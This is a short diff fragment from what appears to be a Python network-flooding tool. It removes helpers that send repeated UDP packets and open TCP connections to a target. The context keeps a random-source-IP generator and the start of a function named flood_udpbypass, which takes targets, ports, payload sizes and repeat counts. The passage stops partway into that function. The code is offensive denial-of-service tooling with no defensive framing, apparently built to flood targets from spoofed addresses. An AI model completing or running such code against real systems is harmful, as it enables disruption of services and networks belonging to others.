@@ -11,32 +11,11 @@ from colorama import *
 def rand_str(length):
     return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))
 
-
 def randomize_ip(base_ip, netmask):
     base_int = struct.unpack("!I", socket.inet_aton(base_ip))[0]
     random_part = random.randint(0, (1 << (32 - netmask)) - 1)
     randomized_ip = struct.pack("!I", base_int + random_part)
     return socket.inet_ntoa(randomized_ip)
-
-
-def send_udp(sock, target_addr, payload, repeat):
-    for _ in range(repeat):
-        try:
-            sock.sendto(payload, target_addr)
-        except OSError as e:
-            print(f"Error sending UDP packet: {e}")
-        time.sleep(0.001)
-
-
-def tcp_handshake(target_ip, target_port):
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-            sock.settimeout(1)
-            sock.connect((target_ip, target_port))
-            sock.close()
-    except (socket.timeout, OSError):
-        pass
-
 
 def flood_udpbypass(targets, source_port, dest_port, payload_size, random_payload, repeat, csleep, netmask):
     sockets = []
